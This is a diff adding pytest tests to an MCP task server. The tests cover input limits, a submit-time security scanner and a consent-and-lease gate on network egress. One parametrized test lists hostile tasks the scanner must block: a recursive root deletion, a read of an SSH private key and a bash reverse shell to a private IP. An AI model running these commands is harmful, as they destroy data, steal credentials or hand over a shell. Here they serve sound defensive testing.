@@ -61,6 +61,25 @@ def test_sanitize_rejects_too_many_tags():
     assert problem is not None
 
 
+def test_sanitize_truncates_oversized_topic():
+    big = "x" * (70 * 1024)
+    cleaned, problem = server._sanitize({"topic": big})
+    assert problem is None
+    assert len(cleaned["topic"].encode("utf-8")) <= 64 * 1024
+
+
+def test_sanitize_rejects_too_many_sources():
+    cleaned, problem = server._sanitize({"sources": [f"s{i}" for i in range(40)]})
+    assert problem is not None
+    assert "sources" in problem
+
+
+def test_sanitize_rejects_oversized_source_item():
+    cleaned, problem = server._sanitize({"sources": ["x" * 200]})
+    assert problem is not None
+    assert "sources" in problem
+
+
 # ── _check_rate ────────────────────────────────────────────────────────────
 
 def test_check_rate_allows_burst_then_limits():
@@ -634,8 +653,34 @@ def test_task_submit_writes_mapped_columns_after_confirm(app_id, monkeypatch):
     assert params[0] == result["task_id"]
 
 
+# Patterns the *currently published* kartikeya scanner blocks — this test
+# validates willow's submit-time WIRING, not kartikeya's coverage. (The
+# resource-exhaustion class, incl. fork bombs, is tested in kartikeya's own suite
+# and will also be caught here once that scanner release is on PyPI.)
+@pytest.mark.parametrize("task,category", [
+    ("rm -rf / ", "destructive"),
+    ("cat ~/.ssh/id_rsa", "secret_access"),
+    ("bash -i >& /dev/tcp/10.0.0.1/9 0>&1", "exfiltration"),
+])
+def test_task_submit_scans_at_submit_time(app_id, monkeypatch, task, category):
+    # Defense-in-depth: a dangerous task is refused at submit BEFORE any DB work,
+    # so it never occupies a queue slot. The scan runs ahead of get_pg(), so the
+    # fake Postgres is never even touched.
+    fake = _FakePg(columns=_TASKS_COLUMNS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    result = server.task_submit(app_id=app_id, task=task)
+    assert "KART-SECURITY" in result["error"]
+    assert result["kart_scan"]["category"] == category
+    assert fake.executed == []  # rejected before the queue was touched
+
+
 def _app_with_perms(tmp_path, monkeypatch, name, perms):
     apps_root = tmp_path / "mcp_apps"
+    # Pin WILLOW_HOME too: consent (and the worker heartbeat) resolve from it, and
+    # a test that reads the developer's real ~/.willow passes or fails on the state
+    # of that machine rather than on the code.
+    monkeypatch.setenv("WILLOW_HOME", str(tmp_path))
+    monkeypatch.delenv("WILLOW_SETTINGS_GLOBAL", raising=False)
     monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
     app_dir = apps_root / name
     app_dir.mkdir(parents=True)
@@ -643,9 +688,29 @@ def _app_with_perms(tmp_path, monkeypatch, name, perms):
     return name
 
 
+def _operator_consents(tmp_path, *, internet=True):
+    """Write the standing consent policy the egress gate reads (key 2)."""
+    (tmp_path / "settings.global.json").write_text(
+        json.dumps({"version": 1, "consent": {"internet": internet,
+                                              "cloud_llm": True, "lan": True}})
+    )
+
+
+def _operator_leases(app, *, ttl_seconds=1800):
+    """Issue the egress lease the gate reads (key 3, B-32).
+
+    Goes through `lease.grant` rather than writing the file directly: a test that
+    hand-writes the artifact would keep passing if `grant` started emitting a
+    shape the reader rejects.
+    """
+    from willow_mcp import lease
+    return lease.grant(app, ttl_seconds, issuer="test-operator", reason="unit test")
+
+
 def test_task_submit_allow_net_denied_without_task_net_permission(tmp_path, monkeypatch):
     # B-19: full_access grants task_submit but NOT the escalated net capability.
     app = _app_with_perms(tmp_path, monkeypatch, "netless", ["full_access"])
+    _operator_consents(tmp_path)  # consent is ON — the manifest is what denies
     fake = _FakePg(columns=_TASKS_COLUMNS)
     monkeypatch.setattr(server, "get_pg", lambda: fake)
 
@@ -660,6 +725,8 @@ def test_task_submit_allow_net_appends_directive_with_permission(tmp_path, monke
     # B-19: an app that holds task_net may run with network; the Kart worker's
     # `# allow_net` directive is appended to the task text.
     app = _app_with_perms(tmp_path, monkeypatch, "netapp", ["full_access", "task_net"])
+    _operator_consents(tmp_path)  # B-29: the second key
+    _operator_leases("netapp")    # B-32: the third
     fake = _FakePg(columns=_TASKS_COLUMNS)
     monkeypatch.setattr(server, "get_pg", lambda: fake)
     server.schema_confirm_mapping(app_id=app, table="tasks")
@@ -671,6 +738,46 @@ def test_task_submit_allow_net_appends_directive_with_permission(tmp_path, monke
     assert insert_sql.startswith("INSERT INTO tasks")
     # values dict order is task_id, task, ... so the task column value is params[1]
     assert params[1] == "curl https://example.com\n# allow_net"
+
+
+def test_task_submit_allow_net_denied_when_operator_consent_is_off(tmp_path, monkeypatch):
+    # B-29: task_net is necessary but not sufficient. The operator's standing
+    # consent.internet is the second key, and flipping it off stops egress
+    # without touching a single manifest.
+    app = _app_with_perms(tmp_path, monkeypatch, "netapp3", ["full_access", "task_net"])
+    _operator_consents(tmp_path, internet=False)
+    fake = _FakePg(columns=_TASKS_COLUMNS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+
+    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)
+
+    assert "consent_denied" in result["error"]
+    assert not any("INSERT" in sql for sql, _ in fake.executed)
+
+
+def test_task_submit_allow_net_denied_when_consent_policy_is_absent(tmp_path, monkeypatch):
+    # B-29 fail-closed: no consent policy on disk is not consent. This is also the
+    # CI shape — no settings.global.json anywhere.
+    app = _app_with_perms(tmp_path, monkeypatch, "netapp4", ["full_access", "task_net"])
+    fake = _FakePg(columns=_TASKS_COLUMNS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+
+    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)
+
+    assert "consent_denied" in result["error"]
+
+
+def test_task_submit_without_allow_net_ignores_consent(tmp_path, monkeypatch):
+    # Consent gates egress, not the queue. An isolated task runs with consent off.
+    app = _app_with_perms(tmp_path, monkeypatch, "netapp5", ["full_access"])
+    _operator_consents(tmp_path, internet=False)
+    fake = _FakePg(columns=_TASKS_COLUMNS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    server.schema_confirm_mapping(app_id=app, table="tasks")
+
+    result = server.task_submit(app_id=app, task="echo hi")
+
+    assert result["status"] == "pending"
 
 
 def test_task_submit_no_net_directive_by_default(tmp_path, monkeypatch):
@@ -722,6 +829,8 @@ def test_task_submit_permitted_net_survives_caller_directive_dedup(tmp_path, mon
     # B-21: even when the caller also embeds the directive, a task_net-permitted
     # allow_net=True submit stores exactly one canonical `# allow_net` line.
     app = _app_with_perms(tmp_path, monkeypatch, "netapp2", ["full_access", "task_net"])
+    _operator_consents(tmp_path)  # B-29: the second key
+    _operator_leases("netapp2")   # B-32: the third
     fake = _FakePg(columns=_TASKS_COLUMNS)
     monkeypatch.setattr(server, "get_pg", lambda: fake)
     server.schema_confirm_mapping(app_id=app, table="tasks")
@@ -734,6 +843,138 @@ def test_task_submit_permitted_net_survives_caller_directive_dedup(tmp_path, mon
     insert_sql, params = fake.executed[-1]
     assert params[1].count("# allow_net") == 1
     assert params[1] == "curl https://example.com\n# allow_net"
+
+
+def test_task_submit_allow_net_denied_without_a_lease(tmp_path, monkeypatch):
+    # B-32: capability + consent are necessary but not sufficient. Without an
+    # operator-issued lease there is nothing time-boxing the grant, and a grant
+    # that never expires cannot be distinguished from one taken an hour ago.
+    app = _app_with_perms(tmp_path, monkeypatch, "leaseless", ["full_access", "task_net"])
+    _operator_consents(tmp_path)
+    fake = _FakePg(columns=_TASKS_COLUMNS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+
+    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)
+
+    assert "lease_denied" in result["error"]
+    assert "grant-net" in result["error"]  # names the only path that issues one
+    assert not any("INSERT" in sql for sql, _ in fake.executed)
+
+
+def test_task_submit_allow_net_denied_when_lease_expired(tmp_path, monkeypatch):
+    # The whole point of a lease: it stops working on its own.
+    from willow_mcp import lease
+    app = _app_with_perms(tmp_path, monkeypatch, "expapp", ["full_access", "task_net"])
+    _operator_consents(tmp_path)
+    _operator_leases("expapp", ttl_seconds=1)
+    # Rewrite the deadline into the past rather than sleeping.
+    path = lease.lease_path("expapp")
+    record = json.loads(path.read_text())
+    record["expires_at"] = "2020-01-01T00:00:00+00:00"
+    path.write_text(json.dumps(record))
+    fake = _FakePg(columns=_TASKS_COLUMNS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+
+    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)
+
+    assert "lease_denied" in result["error"]
+    assert "expired" in result["error"]
+    assert not any("INSERT" in sql for sql, _ in fake.executed)
+
+
+def test_task_submit_allow_net_denied_when_lease_names_another_app(tmp_path, monkeypatch):
+    # A name is not an identity. The filename says where we looked; only the
+    # record's own app_id claim counts.
+    from willow_mcp import lease
+    app = _app_with_perms(tmp_path, monkeypatch, "victim", ["full_access", "task_net"])
+    _operator_consents(tmp_path)
+    _operator_leases("victim")
+    path = lease.lease_path("victim")
+    record = json.loads(path.read_text())
+    record["app_id"] = "someone-else"
+    path.write_text(json.dumps(record))
+    fake = _FakePg(columns=_TASKS_COLUMNS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+
+    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)
+
+    assert "lease_denied" in result["error"]
+    assert "mismatch" in result["error"]
+    assert not any("INSERT" in sql for sql, _ in fake.executed)
+
+
+def test_task_submit_allow_net_denied_when_lease_unparseable(tmp_path, monkeypatch):
+    from willow_mcp import lease
+    app = _app_with_perms(tmp_path, monkeypatch, "corrupt", ["full_access", "task_net"])
+    _operator_consents(tmp_path)
+    _operator_leases("corrupt")
+    lease.lease_path("corrupt").write_text("{ not json")
+    fake = _FakePg(columns=_TASKS_COLUMNS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+
+    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)
+
+    assert "lease_denied" in result["error"]
+    assert "malformed" in result["error"]
+
+
+def test_task_submit_lease_checked_after_capability_and_consent(tmp_path, monkeypatch):
+    """Key order is not cosmetic: an app with no capability must hear about the
+    capability, not be told to go ask for a lease it could never use."""
+    app = _app_with_perms(tmp_path, monkeypatch, "ordering", ["full_access"])
+    _operator_consents(tmp_path, internet=False)  # both later keys also absent
+    fake = _FakePg(columns=_TASKS_COLUMNS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+
+    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)
+
+    assert "net_denied" in result["error"]
+    assert "lease_denied" not in result["error"]
+
+
+def test_task_submit_without_allow_net_ignores_the_lease(tmp_path, monkeypatch):
+    # The lease gates egress, not the queue. An isolated task needs no lease.
+    app = _app_with_perms(tmp_path, monkeypatch, "isolated", ["full_access"])
+    fake = _FakePg(columns=_TASKS_COLUMNS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    server.schema_confirm_mapping(app_id=app, table="tasks")
+
+    result = server.task_submit(app_id=app, task="echo hi")
+
+    assert result["status"] == "pending"
+
+
+def test_task_submit_strict_trust_root_denies_when_keys_are_self_writable(tmp_path, monkeypatch):
+    # B-32 strict mode: every key held, but this process can write the files that
+    # grant them, so nothing was actually confirmed by anyone else.
+    app = _app_with_perms(tmp_path, monkeypatch, "strictapp", ["full_access", "task_net"])
+    _operator_consents(tmp_path)
+    _operator_leases("strictapp")
+    monkeypatch.setenv("WILLOW_MCP_STRICT_TRUST_ROOT", "1")
+    fake = _FakePg(columns=_TASKS_COLUMNS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    server.schema_confirm_mapping(app_id=app, table="tasks")
+
+    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)
+
+    assert "trust_root_denied" in result["error"]
+    assert not any("INSERT" in sql for sql, _ in fake.executed)
+
+
+def test_task_submit_strict_trust_root_off_by_default(tmp_path, monkeypatch):
+    """The residual is reported, not enforced by default — enforcing it on a
+    single-uid host would deny every install's egress on upgrade."""
+    app = _app_with_perms(tmp_path, monkeypatch, "laxapp", ["full_access", "task_net"])
+    _operator_consents(tmp_path)
+    _operator_leases("laxapp")
+    monkeypatch.delenv("WILLOW_MCP_STRICT_TRUST_ROOT", raising=False)
+    fake = _FakePg(columns=_TASKS_COLUMNS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    server.schema_confirm_mapping(app_id=app, table="tasks")
+
+    result = server.task_submit(app_id=app, task="curl https://example.com", allow_net=True)
+
+    assert result["status"] == "pending"
 
 
 def test_task_status_not_found(app_id, monkeypatch):
@@ -829,3 +1070,129 @@ def test_fleet_health_table_not_found(app_id, monkeypatch):
     monkeypatch.setattr(server, "get_pg", lambda: fake)
     result = server.fleet_health(app_id=app_id)
     assert result == {"error": "table_not_found", "table": "tasks"}
+
+
+# ── Gap backlog tools (gap_log/list/resolve are SOIL-only; gap_promote reaches
+# Postgres through the exact same _knowledge_ingest_core/schema-confirmation
+# path as knowledge_ingest, tested here with the same _FakePg double) ─────────
+
+def test_gap_log_denied_without_permission(tmp_path, monkeypatch):
+    apps_root = tmp_path / "mcp_apps"
+    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
+    app_dir = apps_root / "reader_only"
+    app_dir.mkdir(parents=True)
+    (app_dir / "manifest.json").write_text(json.dumps({"permissions": ["gap_read"]}))
+
+    result = server.gap_log(app_id="reader_only", topic="t", question="What color?")
+    assert "denied" in result["error"]
+
+
+def test_gap_log_and_list_round_trip(app_id):
+    logged = server.gap_log(app_id=app_id, topic="t-server", question="What is the accent color?")
+    assert logged["status"] == "open"
+
+    rows = server.gap_list(app_id=app_id, topic="t-server")
+    assert any(r["question"] == "What is the accent color?" for r in rows)
+
+
+def test_gap_resolve_marks_bookkeeping_status(app_id):
+    logged = server.gap_log(app_id=app_id, topic="t-server-resolve", question="What is the border radius?")
+    result = server.gap_resolve(app_id=app_id, gap_id=logged["id"], note="drafted")
+    assert result["status"] == "resolved"
+
+
+def test_gap_promote_refuses_until_confirmed(app_id, monkeypatch):
+    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    logged = server.gap_log(app_id=app_id, topic="t-server-promote-1", question="What is the accent color?")
+
+    result = server.gap_promote(
+        app_id=app_id,
+        gap_id=logged["id"],
+        answer="The accent color is #88c0d0.",
+        sources=["safe-library/themes/nord.json"],
+        confirmed_by="designer",
+    )
+
+    assert "unconfirmed_schema" in result["error"]
+
+
+def test_gap_promote_requires_answer_sources_and_confirmed_by(app_id, monkeypatch):
+    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    server.schema_confirm_mapping(app_id=app_id, table="knowledge")
+    logged = server.gap_log(app_id=app_id, topic="t-server-promote-2", question="What is the accent color?")
+
+    missing_answer = server.gap_promote(
+        app_id=app_id, gap_id=logged["id"], answer="", sources=["x"], confirmed_by="designer",
+    )
+    missing_sources = server.gap_promote(
+        app_id=app_id, gap_id=logged["id"], answer="answer", sources=[], confirmed_by="designer",
+    )
+    missing_confirmed_by = server.gap_promote(
+        app_id=app_id, gap_id=logged["id"], answer="answer", sources=["x"], confirmed_by="",
+    )
+    for result in (missing_answer, missing_sources, missing_confirmed_by):
+        assert "required" in result["error"]
+
+
+def test_gap_promote_writes_knowledge_and_closes_gap(app_id, monkeypatch):
+    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    server.schema_confirm_mapping(app_id=app_id, table="knowledge")
+    logged = server.gap_log(app_id=app_id, topic="t-server-promote-3", question="What is the accent color?")
+
+    result = server.gap_promote(
+        app_id=app_id,
+        gap_id=logged["id"],
+        answer="The accent color is #88c0d0.",
+        sources=["safe-library/themes/nord.json"],
+        confirmed_by="designer",
+    )
+
+    assert result["promoted"] is True
+    assert result["gap_id"] == logged["id"]
+    insert_sql, params = fake.executed[-1]
+    assert insert_sql.startswith("INSERT INTO knowledge")
+
+    rows = server.gap_list(app_id=app_id, topic="t-server-promote-3", status="promoted")
+    assert rows and rows[0]["promoted_to"] == result["id"]
+
+
+def test_gap_promote_missing_gap_errors(app_id, monkeypatch):
+    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    server.schema_confirm_mapping(app_id=app_id, table="knowledge")
+
+    result = server.gap_promote(
+        app_id=app_id, gap_id="does-not-exist-xyz", answer="a", sources=["x"], confirmed_by="designer",
+    )
+    assert result == {"error": "not_found"}
+
+
+def test_gap_promote_already_promoted_gap_errors(app_id, monkeypatch):
+    fake = _FakePg(columns=_KNOWLEDGE_COLUMNS_NO_TAGS)
+    monkeypatch.setattr(server, "get_pg", lambda: fake)
+    server.schema_confirm_mapping(app_id=app_id, table="knowledge")
+    logged = server.gap_log(app_id=app_id, topic="t-server-promote-4", question="What is the accent color?")
+    server.gap_promote(
+        app_id=app_id, gap_id=logged["id"], answer="a", sources=["x"], confirmed_by="designer",
+    )
+
+    result = server.gap_promote(
+        app_id=app_id, gap_id=logged["id"], answer="b", sources=["y"], confirmed_by="designer",
+    )
+    assert result["error"] == "already_promoted"
+
+
+def test_gap_promote_denied_without_gap_promote_permission(tmp_path, monkeypatch):
+    apps_root = tmp_path / "mcp_apps"
+    monkeypatch.setenv("WILLOW_MCP_APPS_ROOT", str(apps_root))
+    app_dir = apps_root / "writer_only"
+    app_dir.mkdir(parents=True)
+    (app_dir / "manifest.json").write_text(json.dumps({"permissions": ["gap_write"]}))
+
+    result = server.gap_promote(
+        app_id="writer_only", gap_id="whatever", answer="a", sources=["x"], confirmed_by="designer",
+    )
+    assert "denied" in result["error"]
